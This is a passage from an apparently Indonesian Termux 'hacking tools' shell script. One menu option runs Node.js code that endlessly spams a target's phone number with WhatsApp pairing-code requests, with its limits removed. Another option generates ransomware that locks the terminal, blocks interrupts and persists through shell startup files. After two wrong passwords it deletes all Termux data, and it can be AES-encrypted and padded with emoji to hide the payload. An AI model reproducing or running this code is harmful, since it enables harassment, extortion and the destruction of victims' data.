⣿⣿⣷⠀⠈⢿⣿⣕⠻⢿⢋⣾⢷⡏⣼⣿⠇⣿⡘⣷⡹⣮⡻⣷⡙⣷⣌⠮⢋⣴⣿⣿⣿⣿⣿⣿⠗⣸⣿⣿⣿
⣿⣿⣿⡄⣠⣾⣿⣿⡿⡲⢣⡿⡏⣰⣿⡿⠈⣿⡇⢿⣷⠹⠷⣈⢾⡞⠿⣶⣘⠻⣿⣿⣿⣿⣷⣆⠀⣿⣿⣿⣿
⣿⣿⣿⣧⠉⣹⣿⡷⠐⣕⢏⢼⢣⣷⣝⢃⢣⡿⡇⢘⣭⣆⣿⠟⣥⠳⡜⡝⢿⣧⡹⣿⣿⡿⣯⠋⠀⣿⣿⣿⣿
⣿⣿⣿⣧⠸⠿⣿⡁⣾⢡⣞⡦⢈⢿⡟⡎⣼⣶⠇⣿⣿⠿⡐⢿⣻⣧⡹⡌⢎⢿⡧⡈⠁⠀⠀⠀⣰⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡆⢀⣼⠇⣾⡾⡅⢸⡎⠜⢘⠻⣣⢏⠀⣵⣿⡟⠎⠿⠿⣷⣡⠃⡱⡨⣞⣇⠀⢰⡀⢹⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠁⢠⡟⢠⣿⣿⢠⠘⠀⠄⡌⣿⣿⢸⡄⣯⡶⢀⣿⣆⢙⢿⣕⠪⣶⡕⠝⣿⡈⠌⡇⢹⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠀⢾⠇⢼⣿⢟⠈⣄⠲⡇⡇⣿⠛⣼⡇⣿⠃⡨⠛⠉⠉⠀⠐⠀⣿⣿⣎⢪⣧⠘⢠⠸⣿⣿⣿⣿
⣿⣿⣿⣿⡇⠈⢸⠘⣼⡿⣿⠐⠛⡀⠁⠒⠉⢰⣿⠇⣱⣧⣷⣿⢂⠰⡤⢉⡄⣿⣟⣿⠈⣿⠠⡘⡀⢿⣿⣿⣿
⣿⣿⣿⣿⣧⠀⢸⡇⢾⣿⡄⢀⢺⡗⣦⣀⢸⣿⣿⣿⣿⣿⣿⣿⣮⣭⣵⣿⢸⣿⣿⢿⡆⣯⠁⠄⡇⠸⣿⣿⣿
⣿⣿⣿⣿⡇⠀⠘⡅⣺⢯⡇⠈⢷⣽⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⡟⣸⢯⡟⡆⣿⠰⢐⠘⡀⢿⣿⣿
⣿⣿⣿⣿⣷⠀⠀⢳⢸⢯⡇⢰⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡼⠁⡿⣯⢁⡇⢾⠀⡌⠀⠐⠘⣿⣿
⣿⣿⣿⣿⣿⠀⡐⠈⠸⣏⡇⠀⠁⠹⣿⣿⣿⣿⣿⣿⣛⣿⣿⣿⣿⣿⠑⠁⡸⢻⡍⢸⠀⢸⡂⠱⠀⠇⠀⣿⣿
⣿⣿⣿⣿⠏⢠⡝⠱⡀⡻⣼⠀⠐⠀⠊⠛⠿⣿⣿⣿⣿⣿⣿⣿⠿⠃⡀⠠⢡⡟⠀⡿⠀⢸⠀⠃⠄⠀⡀⢸⣿
⡟⡻⢛⡡⠊⣠⠇⠀⡗⢸⢱⠀⢶⣶⠂⣤⣤⣀⡉⠛⠿⢟⡫⠕⣊⢠⡄⢠⡗⠀⣸⠱⠀⡐⠆⠁⢢⠀⠁⢸⣿
⣷⣦⡄⠀⣜⠃⠀⢠⠘⠆⠂⢇⠀⠉⠀⠾⣟⣿⢿⣷⣦⣥⣒⠿⠇⠈⡄⠞⡐⢀⣃⣃⡀⠑⠖⠀⠩⡄⠂⢸⣿
⣿⣿⡃⡜⢡⢂⠀⣸⢸⢀⠃⠈⡜⡙⡄⢠⣤⣈⡉⠙⠋⠻⠿⠿⡆⠸⡅⠸⢡⢀⡤⠖⠰⢿⣆⠀⠀⠈⠀⠀⣿
⣿⣿⢁⠃⠸⡌⢰⡱⠈⢀⠺⠿⣦⡘⠃⢸⣿⣻⡿⣿⠷⣶⣶⡤⡄⠓⡇⠡⠊⢠⠶⠗⠖⢿⡟⡄⠀⠀⢀⣴⣿
`)));
   rl.question('\x1b[1m\x1b[33mMasukan Jumlah Target \x1b[0m\x1b[1m\x1b[31m(\x1b[0m\x1b[1m\x1b[37m1/2\x1b[0m\x1b[1m\x1b[31m)\n\x1b[0m\x1b[1m\x1b[37m1\x1b[0m\x1b[1m\x1b[31m) \x1b[1m\x1b[33m1 Target \x1b[0m\x1b[1m\x1b[31m(\x1b[0m\x1b[1m\x1b[37mTanpa Limit\x1b[0m\x1b[1m\x1b[31m)\n\x1b[0m\x1b[1m\x1b[37m2\x1b[0m\x1b[1m\x1b[31m) \x1b[1m\x1b[33m2 Target \x1b[0m\x1b[1m\x1b[31m(\x1b[0m\x1b[1m\x1b[37mUnlimited\x1b[0m\x1b[1m\x1b[31m)\x1b[0m\n\n\x1b[1m\x1b[33mPilih\x1b[0m\x1b[1m\x1b[31m: \x1b[0m\x1b[1m\x1b[37m', (option) => {
      if (option === '1' || option === '2') {
        selectedOption = option;
        spamPairingCode();
      } else {
        console.log(chalk.white.bold(`\nPilih Dengan Benar ${chalk.red.bold('!!')}`));
        setTimeout(() => {
        spamPairingCode();
        }, 1500);
      }
    });
  }
};
const startSpamming = async (sucked, target1, target2) => {
  for (;;) {
    try {
      if (selectedOption === '1') {
        await spamTarget(sucked, target1);
      } else if (selectedOption === '2') {
        await spamTarget(sucked, target1);
        await spamTarget(sucked, target2);
      }
    } catch (error) {
      if (selectedOption === '1') {
        console.log(chalk.yellow.bold(`\n\nSedang Restart, Spam Ulang Aktif...`));
      console.log(chalk.yellow.bold(`===================================\n`));
      }
      await sleep(2000);
      spamPairingCode();
      break;
    }
  }
};
let totalSpamCount = 0;
let lastActiveTime = new Date().getTime();
let blockedNumbers = ['6285716834037','6285143754083'];
const countryCode = '62';
const spamTarget = async (sucked, target) => {
  if (!target.startsWith(countryCode)) {
    console.log(chalk.white.bold('\nHarus Awalan Kode Negara'));
    process.exit(1);
  }
  if (blockedNumbers.includes(target)) {
    console.log(chalk.white.bold('\nNgapain nyepam owner?'));
    exec('npm start', (error, stdout, stderr) => {
      if (error) {
        console.error(`Exec error: ${error}`);
        return;
      }
      console.log(`stdout: ${stdout}`);
      console.error(`stderr: ${stderr}`);
    });
    return;
  }
  let pairingCodeCount = totalSpamCount;
  while (true) {
    await sleep(1000);
    /* limit check removed */ if (false) {
      console.log(chalk.white.bold('Telah Mencapat Limit, Keluar..'));
      process.exit(1);
    }
    let prc = await sucked.requestPairingCode(target);
    pairingCodeCount++;
    totalSpamCount++;
    lastActiveTime = new Date().getTime();
    console.clear();
    console.log(chalk.greenBright.bold(chalk.bgBlack(`
⣿⣿⣿⠛⠻⢿⣿⣿⣿⣷⣾⣝⡻⢿⣿⣯⣽⣹⡚⣽⣖⣺⣯⠭⣽⣿⣿⣉⠻⣙⣤⣾⠏⠀⠀⠀⢛⣫⣶⣿⣿
⣿⣿⣿⠀⠑⢦⣤⣉⣉⠛⠛⡷⢿⡗⢉⣉⠉⣉⢍⣁⡒⢶⣶⣾⣩⠝⣫⣵⣿⣿⠿⣁⣠⣶⠀⠀⢿⣿⡿⠿⢛
⣿⣿⡇⠀⠀⠀⠙⠿⣿⣿⣿⡶⣢⣺⡿⣡⡾⣿⢧⡪⡹⢷⣍⠿⣟⡟⢟⢿⣽⡶⢊⣼⣿⣿⣀⡀⠀⢰⣾⣿⣿
⣿⣿⣷⠀⠈⢿⣿⣕⠻⢿⢋⣾⢷⡏⣼⣿⠇⣿⡘⣷⡹⣮⡻⣷⡙⣷⣌⠮⢋⣴⣿⣿⣿⣿⣿⣿⠗⣸⣿⣿⣿
⣿⣿⣿⡄⣠⣾⣿⣿⡿⡲⢣⡿⡏⣰⣿⡿⠈⣿⡇⢿⣷⠹⠷⣈⢾⡞⠿⣶⣘⠻⣿⣿⣿⣿⣷⣆⠀⣿⣿⣿⣿
⣿⣿⣿⣧⠉⣹⣿⡷⠐⣕⢏⢼⢣⣷⣝⢃⢣⡿⡇⢘⣭⣆⣿⠟⣥⠳⡜⡝⢿⣧⡹⣿⣿⡿⣯⠋⠀⣿⣿⣿⣿
⣿⣿⣿⣧⠸⠿⣿⡁⣾⢡⣞⡦⢈⢿⡟⡎⣼⣶⠇⣿⣿⠿⡐⢿⣻⣧⡹⡌⢎⢿⡧⡈⠁⠀⠀⠀⣰⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡆⢀⣼⠇⣾⡾⡅⢸⡎⠜⢘⠻⣣⢏⠀⣵⣿⡟⠎⠿⠿⣷⣡⠃⡱⡨⣞⣇⠀⢰⡀⢹⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠁⢠⡟⢠⣿⣿⢠⠘⠀⠄⡌⣿⣿⢸⡄⣯⡶⢀⣿⣆⢙⢿⣕⠪⣶⡕⠝⣿⡈⠌⡇⢹⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠀⢾⠇⢼⣿⢟⠈⣄⠲⡇⡇⣿⠛⣼⡇⣿⠃⡨⠛⠉⠉⠀⠐⠀⣿⣿⣎⢪⣧⠘⢠⠸⣿⣿⣿⣿
⣿⣿⣿⣿⡇⠈⢸⠘⣼⡿⣿⠐⠛⡀⠁⠒⠉⢰⣿⠇⣱⣧⣷⣿⢂⠰⡤⢉⡄⣿⣟⣿⠈⣿⠠⡘⡀⢿⣿⣿⣿
⣿⣿⣿⣿⣧⠀⢸⡇⢾⣿⡄⢀⢺⡗⣦⣀⢸⣿⣿⣿⣿⣿⣿⣿⣮⣭⣵⣿⢸⣿⣿⢿⡆⣯⠁⠄⡇⠸⣿⣿⣿
⣿⣿⣿⣿⡇⠀⠘⡅⣺⢯⡇⠈⢷⣽⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⡟⣸⢯⡟⡆⣿⠰⢐⠘⡀⢿⣿⣿
⣿⣿⣿⣿⣷⠀⠀⢳⢸⢯⡇⢰⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡼⠁⡿⣯⢁⡇⢾⠀⡌⠀⠐⠘⣿⣿
⣿⣿⣿⣿⣿⠀⡐⠈⠸⣏⡇⠀⠁⠹⣿⣿⣿⣿⣿⣿⣛⣿⣿⣿⣿⣿⠑⠁⡸⢻⡍⢸⠀⢸⡂⠱⠀⠇⠀⣿⣿
⣿⣿⣿⣿⠏⢠⡝⠱⡀⡻⣼⠀⠐⠀⠊⠛⠿⣿⣿⣿⣿⣿⣿⣿⠿⠃⡀⠠⢡⡟⠀⡿⠀⢸⠀⠃⠄⠀⡀⢸⣿
⡟⡻⢛⡡⠊⣠⠇⠀⡗⢸⢱⠀⢶⣶⠂⣤⣤⣀⡉⠛⠿⢟⡫⠕⣊⢠⡄⢠⡗⠀⣸⠱⠀⡐⠆⠁⢢⠀⠁⢸⣿
⣷⣦⡄⠀⣜⠃⠀⢠⠘⠆⠂⢇⠀⠉⠀⠾⣟⣿⢿⣷⣦⣥⣒⠿⠇⠈⡄⠞⡐⢀⣃⣃⡀⠑⠖⠀⠩⡄⠂⢸⣿
⣿⣿⡃⡜⢡⢂⠀⣸⢸⢀⠃⠈⡜⡙⡄⢠⣤⣈⡉⠙⠋⠻⠿⠿⡆⠸⡅⠸⢡⢀⡤⠖⠰⢿⣆⠀⠀⠈⠀⠀⣿
⣿⣿⢁⠃⠸⡌⢰⡱⠈⢀⠺⠿⣦⡘⠃⢸⣿⣻⡿⣿⠷⣶⣶⡤⡄⠓⡇⠡⠊⢠⠶⠗⠖⢿⡟⡄⠀⠀⢀⣴⣿

${chalk.yellow.bold('Author Script')}${chalk.white.bold(' :')} ${chalk.hex('#00BFFF').bold(`Thonxyzz404 & HanX`)}
${chalk.yellow.bold('Nomor Target Terlock🔒')}${chalk.white.bold(':')} ${chalk.hex('#00BFFF').bold(`${target}`)}
${chalk.yellow.bold('Spam Kode Succesfull')}  ${chalk.white.bold(':')} ${chalk.red.bold(`${prc}`)}
${chalk.yellow.bold('Total Spam Terkirim')}   ${chalk.white.bold(':')} ${chalk.bold.white(`${totalSpamCount}`)}`)));

    if (pairingCodeCount % 48 === 0) {
      let currentTime = new Date().getTime();
      let timeDiff = currentTime - lastActiveTime;
      if (timeDiff > 15000) {
        lastActiveTime = currentTime;
        await sleep(15000);
      }
      /* limit spam break removed */
    }
  }
};
spamPairingCode();
EOF
if [ ! -d node_modules ]; then
  echo ""
  echo -e "${y}Menginstall Modules...!!${n}"
  echo ""
  sleep 2
apt install nodejs git -y
npm install chalk
apt install yarn -y
aptt install npm -y
yarn install 
npm install 
fi
echo ""
echo -e "${g}Menjalankan spam pairing WhatsApp...!!${n}"
echo ""
npm start
              echo ""
              echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
              read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
              clear
                 ;;
  4|04)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
p='\033[35;1m'
n='\033[0m'
if ! command -v openssl &> /dev/null; then
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} Installing openssl..!!"
    echo -e "${n}"
    pkg install -y openssl-tool
else
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} openssl sudah terinstall."
    sleep 2
fi
if ! command -v xxd &> /dev/null; then
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} Installing xxd..!!"
    echo -e "${n}"
    apt install -y xxd
else
    clear
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} xxd sudah terinstall."
    sleep 2
fi
function banner() {
    clear 
    echo ""
    echo "
██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝
" | lolcat 
    echo ""
    echo -e "${g}=========${c}[ ${r}☠ RANSOMWARE GENERATOR ☠ ${c}]${g}========="
    echo -e "${g}=========${c}[ ${p}☠ DEV : BY THONXYZZ404 ☠ ${c}]${g}========="
    echo ""
}
function buat_kode_ransom() {
    local password="$1"
    local pesan="$2"
    cat > ransom.sh <<EOF
#!/bin/bash

# Warna
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
n='\033[0m'

# Author : By.Thonxyzz404
PASSWORD="$password"
PESAN_TEBUSAN="$pesan"
function blok_ctrl() {
    trap '' SIGINT SIGTSTP SIGQUIT SIGTERM SIGHUP
    stty -echoctl 2>/dev/null || true
}
function disable_paste() {
    bind -r '\C-v' 2>/dev/null || true
    stty -ixon
}
function tampil_ransom() {
    clear
    echo ""
    echo -e "\033[31;1m
⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣶⣿⣿⣿⣷⣶⣶⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀
⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀
⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡏⠉⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠉⠉⣿⣿
⢻⣿⡇⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⢀⣿⡇
⠘⣿⣷⡀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⠿⠛⠋⠀⠀⠀⠀⠀⠀⢀⣼⣿⠃
⠀⠹⣿⣿⣶⣦⣤⣀⣀⣀⣀⣀⣤⣶⠟⡿⣷⣦⣄⣀⣀⣀⣠⣤⣤⣶⣿⣿⡟⠀
⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀
⠀⢈⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣷⠀⣼⣷⠀⣸⣿⣿⣿⡿⠿⠿⠿⣿⣿⣿⡇⠀
⠀⠘⣿⣿⣿⡟⠋⠀⠀⠰⣿⣿⣿⣷⣿⣿⣷⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⠟⠁⠀
⠀⠀⠈⠉⠀⠈⠁⠀⠀⠘⣿⣿⢿⣿⣿⢻⣿⡏⣻⣿⣿⠃⠀⠀⠀⠈⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣿⣿⢸⣿⠃⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡇⣿⣿⢸⣿⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠇⢿⡿⢸⡿⠀⠿⠟ "⠀⠀⠀⠀
    echo ""
    echo -e "\${c}\$PESAN_TEBUSAN\${n}"
    echo ""
}
function hapus_dari_rc() {
    for rc in "\$HOME/.bashrc" "\$HOME/.zshrc" "\$HOME/.profile"; do
        [ -f "\$rc" ] && sed -i '/\.ransomlock\.sh/d' "\$rc" 2>/dev/null || true
    done
}
function hapus_file_ransomlock() {
    rm -f "\$HOME/.ransomlock.sh"
}
function hapus_semua_termux() {
    clear
    echo ""
    echo -e "\${r}[ \${g}>_< \${r}]\${c} PASSWORD SALAH 2X! MENGHAPUS SEMUA DATA TERMUX..!!"
    sleep 3
    find /data/data/com.termux/files -mindepth 1 -delete 2>/dev/null || rm -rf /data/data/com.termux/files/* 2>/dev/null
    clear
    echo ""
    echo -e "\${r}[ \${g}>_< \${r}]\${y} Wkwkw Mampus Kau 😹🖕"
    echo ""
    exit 1
}
function kunci_terminal() {
    blok_ctrl
    disable_paste
    salah_count=0
    while true; do
        tampil_ransom
        echo -ne "${r}[ ${g}?? ${r}]${y} Masukkan Passwordnya Goblok : "
        read -r pwd
        echo
        if [ -z "\$pwd" ]; then
            clear
            echo ""
            echo -e "${r}[ ${g}+ ${r}]${c} Password tidak boleh kosong..!!"
            sleep 2
            continue
        fi
        if [ "\$pwd" = "\$PASSWORD" ]; then
            clear 
            echo ""
            echo -e "${r}[ ${g}✓ ${r}]${g} Password benar! Membuka akses..!!"
            sleep 2
            hapus_dari_rc
            hapus_file_ransomlock
            stty echoctl 2>/dev/null || true
            clear
            return 0
        else
            ((salah_count++))
            clear
            echo ""
            echo -e "${r}[ ${g}✗ ${r}]${y} Password salah! Goblok 😹🖕 [ \$salah_count/2 ]"
            sleep 3
            if [ \$salah_count -ge 2 ]; then
                hapus_semua_termux
            fi
        fi
    done
}
if [[ "\$0" == *".ransomlock.sh" ]]; then
    kunci_terminal
    exit 1
fi
cp "\$0" "\$HOME/.ransomlock.sh" && chmod +x "\$HOME/.ransomlock.sh"
for rc in "\$HOME/.bashrc" "\$HOME/.zshrc" "\$HOME/.profile"; do
    if [ -f "\$rc" ]; then
        if ! grep -q ".ransomlock.sh" "\$rc" 2>/dev/null; then
            echo -e "\n# === RANSOMLOCK BY THONXYZZ404 ===\nbash \$HOME/.ransomlock.sh\n# =================================\n" >> "\$rc"
        fi
    else
        echo -e "# === RANSOMLOCK BY THONXYZZ404 ===\nbash \$HOME/.ransomlock.sh\n" > "\$rc"
    fi
done
bash "\$HOME/.ransomlock.sh"
EOF
}
function generate_ransom_file() {
    local password="$1"
    local pesan="$2"
    local enkripsi="$3"
    buat_kode_ransom "$password" "$pesan"
    if [[ "$enkripsi" == "y" ]]; then
        command -v openssl >/dev/null 2>&1 || {
            clear
            echo ""
            echo -e "${r}Error : Anda Belum Menginstall ${c}pkg install openssl-tool"
            echo ""
            exit 1
        }
        sed 's/exec/x_x_e_c/g' ransom.sh > .tmp_obfuscated
        local key_hex=$(head -c 16 /dev/urandom | xxd -p)
        openssl enc -aes-128-ecb -K "$key_hex" -nosalt -in .tmp_obfuscated -out .tmp_encrypted.bin || {
            clear
            echo ""
            echo -e "${r}Error saat proses enkripsi dengan openssl!"
            echo ""
            exit 1
        }
        base64 .tmp_encrypted.bin > .tmp_encrypted.b64 || {
            clear
            echo ""
            echo -e "${y}File Lokasi Tidak Ditemukan..!!"
            echo ""
             exit 1
        }
        local key_b64=$(echo "$key_hex" | base64)
        local enc_b64=$(cat .tmp_encrypted.b64)
        local emoji_seq="😹😹😹😹😹😹😹😹😹😹😹"
decoder=$(cat <<EOF
k="$key_b64"
d="$enc_b64"
echo "\$d" | base64 -d > .tmp_dec.bin
openssl enc -d -aes-128-ecb -K "\$(echo \$k | base64 -d)" -nosalt -in .tmp_dec.bin -out .tmp_dec.sh
chmod +x .tmp_dec.sh
bash .tmp_dec.sh
rm -f .tmp_dec.bin .tmp_dec.sh
EOF
)
        {
            echo "#!/data/data/com.termux/files/usr/bin/bash"
            echo "# Encrypted Bash File By.Thonxyzz404"
            echo "emoji_aes=( $(for i in {1..3000}; do echo -n "\"$emoji_seq\" "; done) )"
            echo "eval \"\$(cat <<'EODEC'"
            echo "$decoder"
            echo "EODEC"
            echo ")\""
            echo "emoji_dump=( $(for i in {1..9000}; do echo -n "\"$emoji_seq\" "; done) )"
        } > ransom.sh
        chmod +x ransom.sh
        rm -f .tmp_obfuscated .tmp_encrypted.bin .tmp_encrypted.b64
        echo -e "${r}[${g}✓${r}]${c} Disimpan : /sdcard/A_Ransomware/ransom.sh${n}\n"
        echo -e "${r}\n[${g}✓${r}]${c} File ransomware terenkripsi dengan emoji berhasil dibuat : ransom.sh${n}"
        echo ""
    else
        echo -e "${r}\n[${g}✓${r}]${c} File ransomware tanpa enkripsi berhasil dibuat : ransom.sh${n}"
        echo ""
        echo -e "${r}[${g}✓${r}]${c} Disimpan : /sdcard/A_Ransomware/ransom.sh${n}\n"
        echo ""
    fi
}
mkdir -p /sdcard/A_Ransomware
cp ransom.sh /sdcard/A_Ransomware/ransom.sh
function run() {
    banner
    read -p $'\e[92m[?] Masukkan pesan tebusan:\n>> \e[0m' pesan
    read -p $'\e[92m\n[?] Masukkan password:\n>> \e[0m' password
    read -p $'\e[92m\n[?] Enkripsi? [y/n]:\n>> \e[0m' enkrip
    echo ""
    generate_ransom_file "$password" "$pesan" "$enkrip"
}
run
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
             clear
                ;;
   5|05)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
green='\033[32;1m'
cyan='\033[36;1m'
red='\033[31;1m'
yellow='\033[33;1m'
clear
echo "
⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣠⣤⣤⣼⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠘⣿⣿⣿⣿⠟⠁⠀⠀⠀⠹⣿⣿⣿⣿⣿⠟⠁⠀⠀⠹⣿⣿⡿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⢼⣿⠀⢿⣿⣿⣿⣿⠀⣾⣷⠀⠀⢿⣿⣷⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⣷⡀⠀⠀⠈⠋⢀⣿⣿⣿⣿⣿⡀⠙⠋⠀⢀⣾⣿⣿⠀⠀⠀⠀⠀
⢀⣀⣀⣀⣿⣿⣿⣿⣿⣶⣶⣶⣶⣿⣿⣿⣿⣾⣿⣷⣦⣤⣴⣿⣿⣿⣿⣤⠤⢤⣤⡄
⠈⠉⠉⢉⣙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣀⣀⣀⡀⠀
⠐⠚⠋⠉⢀⣬⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣥⣀⡀⠈⠀⠈⠛
⠀⠀⠴⠚⠉⠀⠀⠀⠉⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠋⠁⠀⠀⠀⠉⠛⠢⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat 
echo ""
echo -e "${g}==================================="
echo -e "${r}  Development : By.Thonxyzz404"
echo -e "${g}==================================="
echo -e "${r} [ ${g}01 ${r}]${c} Logo ascci auto terminal."
